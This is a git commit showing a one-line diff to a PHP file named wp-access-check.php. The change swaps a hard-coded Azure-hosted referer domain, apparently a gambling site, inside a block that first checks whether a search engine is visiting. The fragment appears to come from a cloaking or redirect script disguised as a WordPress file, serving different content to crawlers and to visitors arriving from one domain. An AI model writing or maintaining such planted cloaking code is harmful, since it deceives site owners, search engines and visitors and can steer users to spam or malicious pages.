6c0c105298e22ac043c5438a46223df85647dfa5
Max <hmjim@mail.ru>
2022-04-23 13:19:19 +0700

    23.04

--- wp-access-check.php
+++ wp-access-check.php
@@ -655,7 +655,7 @@ if ( searchEngineDetect() !== NULL ) {
 		{
 			$asdasd = false;
 		}
-		if ( parse_url( $_SERVER["HTTP_REFERER"] )["host"] == "play-avtomatikk.azurewebsites.net" ) {
+		if ( parse_url( $_SERVER["HTTP_REFERER"] )["host"] == "play-avtomatikks.azurewebsites.net" ) {
 			$asdasd = true;
 		}
 	}
